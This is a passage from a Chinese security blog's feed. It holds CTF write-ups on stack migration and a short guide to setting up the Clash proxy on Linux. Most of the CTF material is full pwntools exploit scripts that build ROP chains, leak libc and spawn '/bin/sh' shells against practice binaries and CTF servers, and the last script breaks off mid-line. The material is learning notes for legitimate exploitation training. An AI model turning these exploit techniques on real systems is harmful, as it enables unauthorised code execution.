#接收到的上一个字符为回车符，而当前接收不到新字符，则            content = content[:-1]  +&apos;\x00&apos;             #删除puts函数输出的末尾回车符            break            content += c        else:            up = c    content = content[:4]  #取指定字节数    log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &apos;&apos;).encode(&apos;hex&apos;)))    return contentd = DynELF(leak, elf = elf)system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)log.info(&apos;system_addr = %#x&apos; %system_addr)binsh_addr = 0x601068 - 8payload = padding * &apos;a&apos; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&apos;\x00&apos;*56,start_add])payload = payload.ljust(200,&apos;b&apos;)io.send(payload)io.recvuntil(&apos;bye~\n&apos;)io.send(&apos;/bin/sh\x00&apos;)payload = padding * &apos;a&apos; + flat([pop_rdi,binsh_addr,system_addr])payload = payload.ljust(200,&apos;b&apos;)io.send(payload)io.interactive()</code></pre></div><h3 id="其他获取libc的方法"><a href="#其他获取libc的方法" class="headerlink" title="其他获取libc的方法"></a>其他获取libc的方法</h3><p>虽然DynELF是一个dump利器，但是如果写不出来leak函数，下libc被墙等等。就用这两个网站：<br><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a><br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>都是只有有两个泄露地址，就可以查到对应的libc版本，并且可以给出其原件，接着就可以进行其他操作。</p><p>还有在比赛过程中，如果一个题目不好获取到libc，那么可以看看其他题目的libc，有可能这个赛事平台服务器都是这个版本。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux下clash的使用</title>
    <link href="/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linux下clash的使用"><a href="#linux下clash的使用" class="headerlink" title="linux下clash的使用"></a>linux下clash的使用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只是很简单记录一下，自己如何使用clash的。因为发现终端虽说在本机上已经开了代理，但是终端执行命令下载东西的时候十分的卡，今天才了解到，原来终端的代理是另外开的。所以就开始折腾一下，linux下clash的使用（本人用了很久了clash，所以直接看这个软件了）。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>执行<code>cd &amp;&amp; mkdir clash</code> 在用户目录下创建 clash 文件夹。<br>下载适合的 Clash 二进制文件并解压重命名为 clash,一般个人的64位电脑下载 clash-linux-amd64.tar.gz 即可。<br>地址：<a href="https://github.com/Dreamacro/clash/releases" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/releases</a></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>在终端cd到Clash二进制文件所在的目录,把Clash 配置文件给移进去。配置文件的名称要是config.yaml<br><img src="/2020/02/14/linux下clash的使用/images/15816946080116.jpg" srcset="/img/loading.gif" alt="-w286"></p><p>我是直接创建了这个文件，并写入的自己的配置，因为mac本机一直用这个软件，然后在配置文件找到主使用那个，直接复制那个自己使用代理网站加载下来的配置给config.yaml。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><code>chmod +x ./clash</code>加执行权限<br>执行 ./clash -d . 即可启动 Clash，同时启动 HTTP 代理和 Socks5 代理。<br>然后进入这个<a href="http://clash.razord.top/" target="_blank" rel="noopener">http://clash.razord.top/</a> 链接可以对代理进行个简单管理<br><img src="/2020/02/14/linux下clash的使用/images/15816952499188.jpg" srcset="/img/loading.gif" alt="-w794"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>打开系统设置，选择网络，点击网络代理右边的 ⚙ 按钮，选择手动，填写 HTTP 和 HTTPS 代理为 127.0.0.1:7890，填写 Socks 主机为 127.0.0.1:7891，即可启用系统代理。<br><img src="file:///Volumes/data/chumenblog/source/images/15816953014396.jpg" srcset="/img/loading.gif" alt="-w409"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>终端开启代理<br><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891</code><br>执行这个命令即可。<br><img src="file:///Volumes/data/chumenblog/source/images/15816954013538.jpg" srcset="/img/loading.gif" alt="-w495"><br>出现这个就是代理成功了，然后就会发现终端下载东西的神速。</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stack Migration题目练习</title>
    <link href="/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Stack-Migration题目练习"><a href="#Stack-Migration题目练习" class="headerlink" title="Stack Migration题目练习"></a>Stack Migration题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录几道Stack Migration的练习题。</p><h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><h3 id="查看保护和arch"><a href="#查看保护和arch" class="headerlink" title="查看保护和arch"></a>查看保护和arch</h3><div class="hljs"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      <span class="hljs-function">No <span class="hljs-title">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span></span></code></pre></div><p>32位程序，开了nx和Canary保护。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">int</span> de_s; <span class="hljs-comment">// [esp+18h] [ebp-28h]</span>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+1Eh] [ebp-22h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> de_length; <span class="hljs-comment">// [esp+3Ch] [ebp-4h]</span>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x1E</span>u);  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Authenticate : "</span>);  _isoc99_scanf(<span class="hljs-string">"%30s"</span>, &amp;s);  <span class="hljs-built_in">memset</span>(&amp;input, <span class="hljs-number">0</span>, <span class="hljs-number">0xC</span>u);  de_s = <span class="hljs-number">0</span>;  de_length = Base64Decode((<span class="hljs-keyword">int</span>)&amp;s, &amp;de_s);     <span class="hljs-comment">// v6 = 解码后的长度</span>  <span class="hljs-keyword">if</span> ( de_length &gt; <span class="hljs-number">0xC</span> )  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong Length"</span>);  &#125;  <span class="hljs-keyword">else</span>  &#123;    <span class="hljs-built_in">memcpy</span>(&amp;input, de_s, de_length);  <span class="hljs-comment">// 执行完，把解码后的字段，放入input的bss内存上</span>    <span class="hljs-keyword">if</span> ( auth(de_length) == <span class="hljs-number">1</span> )      correct();  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>（其中已经改了部分变量的名称方便读代码）<br>流程就是接受一段base64编码过的字符串，然后进行一下解码，解码返回长度给变量，且做与12大小的比较，如果解码后大于12，就直接退出程序，并且解码的字符串是放在input的这个全局变量里：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814303737109.jpg" srcset="/img/loading.gif" alt="-w601"><br>接着进入auth函数分析一下：</p><div class="hljs"><pre><code class="hljs c">_BOOL4 __<span class="hljs-function">cdecl <span class="hljs-title">auth</span><span class="hljs-params">(<span class="hljs-keyword">int</span> length)</span></span>&#123;  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span>  <span class="hljs-keyword">char</span> *s2; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+20h] [ebp-8h]</span>  <span class="hljs-built_in">memcpy</span>(&amp;v4, &amp;input, length);  s2 = (<span class="hljs-keyword">char</span> *)calc_md5((<span class="hljs-keyword">int</span>)&amp;v2, <span class="hljs-number">12</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hash : %s\n"</span>, s2);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">"f87cd601aa7fedca99018a8be88eda34"</span>, s2) == <span class="hljs-number">0</span>;&#125;</code></pre></div><p>可以发现其是一个md5加密后，然后跟后面那串字符串对比。并且看一下v4变量：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814310284289.jpg" srcset="/img/loading.gif" alt="-w407"><br>发现memcpy这个函数会引起栈溢出，但是可控的只是12-8 = 4字节。<img src="/2020/02/11/Stack Migration题目练习/images/15814313605840.jpg" srcset="/img/loading.gif" alt="-w1241"><br>然后输入12位‘1’，编码后放入程序，发现最后的4个字节被放入了ebp，正好这下就可以控制ebp了。接着就有了攻击思路：</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>控制好这个ebp，然后由于这个程序中，auth函数最后有一个leave ret 的gadget，main函数也有一个，正好满足我们来Stack Migration。在栈上摆放的结构为：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814316930734.jpg" srcset="/img/loading.gif" alt="-w353"><br>到时候由于memcpy会复制这个老栈的前12个字节的数据，然后new esp指向的是固定位置input。然后两个leave gadget即可</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *# <span class="hljs-built_in">io</span> = process(<span class="hljs-string">'./login'</span>)<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29026</span>)system_add = <span class="hljs-number">0x08049284</span>buf = <span class="hljs-number">0x0811EB40</span><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'e : '</span>)p = <span class="hljs-string">'aaaa'</span> + p32(system_add) + p32(buf)<span class="hljs-built_in">io</span>.sendline(b64encode(p))<span class="hljs-built_in">io</span>.interactive()</code></pre></div><h2 id="安恒月赛-over-over"><a href="#安恒月赛-over-over" class="headerlink" title="安恒月赛_over.over"></a>安恒月赛_over.over</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><p>64位，只开了nx</p><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs undefined">__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  setvbuf(stdin, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);  setvbuf(stdout, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);  <span class="hljs-keyword">while</span> ( sub_400676() )    ;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>LL;&#125;</code></pre></div><p>主函数十分简单，主要核心就在while包裹的函数:</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400676</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span>  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>uLL);  <span class="hljs-built_in">putchar</span>(<span class="hljs-string">'&gt;'</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x60</span>uLL);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(&amp;buf);&#125;</code></pre></div><p>可以看到溢出可控自己只有8个字节，也就是一个gadget，明显需要Stack Migration，<br>那么就得控制好ebp，padding即为0x50，但是这个题目没有给我们固定的地址，也就是没有全局变量可用，那就想办法看栈偏移了。</p><p>可以看到是read函数，和puts函数的搭配，当往里面塞0x50字节字符是不会添加上’\x00’的:<br><img src="/2020/02/11/Stack Migration题目练习/images/15814741030442.jpg" srcset="/img/loading.gif" alt="-w781"><br><img src="/2020/02/11/Stack Migration题目练习/images/15814741289950.jpg" srcset="/img/loading.gif" alt="-w649"></p><p>然后用puts函数输出时会把ebp里面的值也会输出出来。这下栈偏移是固定的，就可以在read的时候往里面塞rop链，依靠偏移来跳上去执行就可以了。<br><img src="/2020/02/11/Stack Migration题目练习/images/15814770925207.jpg" srcset="/img/loading.gif" alt="-w842"><br>算一下main的ebp与现在的esp差距是112个字节。让ebp-112就等于esp指向了栈顶esp。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>先给程序0x50个字节，然后接收下main的ebp值。然后程序由于while循环再次，进入这个函数，这时候送rop链，第一个rop链可以先泄露下puts的内存地址，然后计算libc的地址，返回地址写成主函数start，清理下栈。然后第二次读的时候，送过去system(/bin/sh)的rop链即可。程序每次读，构造好rop链的时候，要保证送过去80字节，然后控制ebp 为栈顶esp，还有加上leave 的gadget，这下两个leave的gadget就让程序跳回栈头的下个8个字节，开始执行rop链。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./over.over'</span>)e = ELF(<span class="hljs-string">'./over.over'</span>)l = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)leave_ret = <span class="hljs-number">0x004006be</span> pop_rdi_ret = <span class="hljs-number">0x0400793</span>put_got = e.got[<span class="hljs-string">'puts'</span>]put_plt = e.symbols[<span class="hljs-string">'puts'</span>]padding = <span class="hljs-number">80</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendafter(<span class="hljs-string">"&gt;"</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">80</span>)<span class="hljs-comment"># stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70</span>stack = u64((io.recvline())[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x70</span>io.readuntil(<span class="hljs-string">'&gt;'</span>)print(hex(stack))p = flat([<span class="hljs-string">'11111111'</span>,pop_rdi_ret,put_got,put_plt,<span class="hljs-number">0x000400580</span>,(<span class="hljs-number">80</span><span class="hljs-number">-40</span>)*<span class="hljs-string">'1'</span>,stack,leave_ret])raw_input(<span class="hljs-string">'-&gt;'</span>)io.send(p)libc = u64(io.recvuntil(<span class="hljs-string">"\x7f"</span>)[<span class="hljs-number">-6</span>: ].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>)) - l.symbols[<span class="hljs-string">'puts'</span>]print(hex(libc))io.sendafter(<span class="hljs-string">"&gt;"</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">80</span>)stack = u64((io.recvline())[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x70</span>print(hex(stack))io.readuntil(<span class="hljs-string">'&gt;'</span>)system_add = libc + l.symbols[<span class="hljs-string">'system'</span>]binsh_add = libc + l.search(<span class="hljs-string">'/bin/sh\x00'</span>).next()p = flat([<span class="hljs-string">'22222222'</span>,pop_rdi_ret,binsh_add,system_add,(<span class="hljs-number">80</span><span class="hljs-number">-4</span>*<span class="hljs-number">8</span>)*<span class="hljs-string">'2'</span>,stack,leave_ret])io.send(p)io.interactive()</code></pre></div><h2 id="HITCON-training-lab6"><a href="#HITCON-training-lab6" class="headerlink" title="HITCON_training_lab6"></a>HITCON_training_lab6</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-keyword">int</span> count = <span class="hljs-number">1337</span> ;<span class="hljs-keyword">char</span> *t= <span class="hljs-string">"Z\xc3"</span> ;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">if</span>( count!=<span class="hljs-number">1337</span> )&#123;    _exit(<span class="hljs-number">1</span>);&#125;count++ ;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">48</span>];setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"Try your best : "</span> );read(<span class="hljs-number">0</span>, buf,<span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> ;&#125;</code></pre></div><p><code>gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令。<br>然后就不分析了，前面练习64位时候写的那个博客已经记录很清楚了，这里只记录下exp。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *context.arch = 'i386'context.log_level = 'debug'<span class="hljs-comment"># io = process('./migration')</span>io = remote('127.0.0.1',4000)e = ELF('./migration')l = ELF('/lib/i386-linux-gnu/libc-2.23.so')padding = 40puts_plt = e.symbols['puts']puts_got = e.got['puts']read = e.symbols['read']leave_ret = 0x08048418buf1 = 0x0804b000 - 0x100buf2 = buf1 - 0x50pop_edx_ret = 0x0804836dp = 'a' * padding + flat([buf1,read,leave_ret,0,buf1,0x50])<span class="hljs-section">io.readuntil(':\n')</span>io.send(p)p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50])sleep(0.1)raw_input('-&gt;')io.sendline(p)puts_add = u32(io.recv(4))libc = puts_add - l.symbols['puts']print(hex(libc))system_add = l.symbols['system'] + libcbinsh_add = l.search('/bin/sh\x00').next() + libcp = flat([buf1,system_add,system_add,binsh_add])raw_input('-&gt;')<span class="hljs-comment"># sleep(0.1)</span>io.sendline(p)io.interactive()</code></pre></div><h2 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">  RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">  Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">  NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">  PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h3 id="尝试运行"><a href="#尝试运行" class="headerlink" title="尝试运行"></a>尝试运行</h3><p><img src="/2020/02/11/Stack Migration题目练习/images/15817739064330.jpg" srcset="/img/loading.gif" alt="-w602"></p><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>直接看漏洞函数</p><div class="hljs"><pre><code class="hljs undefined">ssize_t vul_function()&#123;  size_t v0; <span class="hljs-comment">// eax</span>  size_t v1; <span class="hljs-comment">// eax</span>  char buf; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span>  v0 = strlen(m1);  write(<span class="hljs-number">1</span>, m1, v0);                             <span class="hljs-comment">// Hello good Ctfer</span>  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x200</span>u);  v1 = strlen(m2);  write(<span class="hljs-number">1</span>, m2, v1);                             <span class="hljs-comment">// What do you want to say?</span>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x20</span>u);&#125;</code></pre></div><p>发现可以利用的gadget只有一个，那就只有leave的gadget了，然后把ebp控制到前面的read函数的s处，其也是全局变量，地址固定。<br><img src="/2020/02/11/Stack Migration题目练习/images/15817774030678.jpg" srcset="/img/loading.gif" alt="-w358"></p><h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>在第一个read的时候，直接把构造的rop链读进去。任务分别是leak 一个函数的内存地址，来用libcseacher算出system，跟/bin/sh字符串的地址，返回start函数清理栈开启第二次使用漏洞； call system（/bin/sh）</li><li>然后第二个read时候，把控ebp指向固定地址s的地址，retaddress 放上leave的gadget。</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *context.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>from LibcSearcher import *e = ELF(<span class="hljs-string">'./spwn'</span>)<span class="hljs-built_in">io</span> = process(<span class="hljs-string">'./spwn'</span>)# libc = e.libc<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28527</span>)padding = <span class="hljs-number">24</span>s = <span class="hljs-number">0x0804A300</span>fake1 = <span class="hljs-number">0x0804A500</span>leave_ret = <span class="hljs-number">0x08048511</span>puts_add = e.symbols[<span class="hljs-string">'puts'</span>]write_plt = e.symbols[<span class="hljs-string">'write'</span>]write_got = e.got[<span class="hljs-string">'write'</span>]<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'name?'</span>)p = flat([fake1,write_plt,<span class="hljs-number">0x080483A0</span>,<span class="hljs-number">1</span>,write_got,<span class="hljs-number">10</span>])<span class="hljs-built_in">io</span>.send(p)<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'say?'</span>)p = padding * <span class="hljs-string">'a'</span> + p32(s) + p32(leave_ret)# raw_input(<span class="hljs-string">'-&gt;'</span>)<span class="hljs-built_in">io</span>.send(p)write_add = u32(<span class="hljs-built_in">io</span>.recv(<span class="hljs-number">4</span>))<span class="hljs-built_in">print</span>(hex(write_add))obj = LibcSearcher(<span class="hljs-string">'write'</span>,write_add)libc_base = write_add - obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'write'</span>) #libc.symbols[<span class="hljs-string">'write'</span>]<span class="hljs-built_in">print</span>(hex(obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'write'</span>)))<span class="hljs-built_in">print</span>(hex(libc_base))sys_add = libc_base + obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'system'</span>) #libc.symbols[<span class="hljs-string">'system'</span>]binsh_add =libc_base + obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'str_bin_sh'</span>) #libc.search(<span class="hljs-string">'/bin/sh\x00'</span>).<span class="hljs-built_in">next</span>()<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'name?'</span>)p = flat([fake1,sys_add,<span class="hljs-number">0x080483A0</span>,binsh_add])<span class="hljs-built_in">io</span>.send(p)<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'say?'</span>)p = padding * <span class="hljs-string">'a'</span> + p32(s) + p32(leave_ret)<span class="hljs-built_in">io</span>.send(p)<span class="hljs-built_in">io</span>.interactive()</code></pre></div><h2 id="ACTF-2019-hardcore-fmt"><a href="#ACTF-2019-hardcore-fmt" class="headerlink" title="ACTF_ 2019_hardcore fmt"></a>ACTF_ 2019_hardcore fmt</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>￼￼￼￼<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/oj5gX3.png" srcset="/img/loading.gif" alt><br>其中可以看到后面的read处，存在一个栈溢出，但是只有一个gadget可以用，需要考虑Stack Migration。其中那个<strong>sub400a1a</strong>函数是问你需要留下多少的字节，肯定要<code>0xe0</code>，所以再送过去的时候就填入0xe0，正好做参数给下面read函数用。</p><p>然后程序接受到0xe0后，进入if语句中，会输出一下堆栈esp的值，这下也是相当于知道了一个特定的地址，然后就正常构造rop链，把控ebp等于为接收到的stack esp，再跟上leava gadget即可。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span><span class="hljs-comment"># io = process('./ACTF_2019_babystack')</span><span class="hljs-comment"># io = remote('node3.buuoj.cn',27626)</span>io = remote(<span class="hljs-string">'challenge-848a378609341016.sandbox.ctfhub.com'</span>, <span class="hljs-number">24656</span>)elf = ELF(<span class="hljs-string">'./ACTF_2019_babystack'</span>)<span class="hljs-comment"># libc = elf.libc</span>io.recvuntil(<span class="hljs-string">'message?\n'</span>)io.sendline(<span class="hljs-string">'224'</span>)io.recvuntil(<span class="hljs-string">'saved at'</span>)stack_addr =  int((io.recvline_contains(<span class="hljs-string">'0x7f'</span>)),<span class="hljs-number">16</span>)print(stack_addr)libc_start_main_got = elf.got[<span class="hljs-string">'__libc_start_main'</span>]puts_plt = elf.symbols[<span class="hljs-string">'puts'</span>]pop_rdi_ret = <span class="hljs-number">0x000400ad3</span>start_addr = <span class="hljs-number">0x000400800</span>leave_ret = <span class="hljs-number">0x400a18</span> payload = flat([<span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span>,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr])payload = payload.ljust(<span class="hljs-number">208</span>,<span class="hljs-string">'a'</span>)payload += flat([stack_addr,leave_ret])io.recvuntil(<span class="hljs-string">'&gt;'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.send(payload)io.recvuntil(<span class="hljs-string">'bye~\n'</span>)libc_start_main_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) <span class="hljs-comment">#- libc.symbols['__libc_start_main']</span>obj = LibcSearcher(<span class="hljs-string">'__libc_start_main'</span>,libc_start_main_addr)libc_base = libc_start_main_addr - obj.dump(<span class="hljs-string">'__libc_start_main'</span>)print(hex(libc_base))io.recvuntil(<span class="hljs-string">'message?\n'</span>)io.sendline(<span class="hljs-string">'224'</span>)io.recvuntil(<span class="hljs-string">'saved at'</span>)stack_addr =  int((io.recvline_contains(<span class="hljs-string">'0x7f'</span>)),<span class="hljs-number">16</span>)print(stack_addr)rec = libc_base + <span class="hljs-number">0x4f2c5</span>payload = flat([<span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span>,rec])payload = payload.ljust(<span class="hljs-number">208</span>,<span class="hljs-string">'\x00'</span>)payload += flat([stack_addr,leave_ret])io.recvuntil(<span class="hljs-string">'&gt;'</span>)raw_input(<span 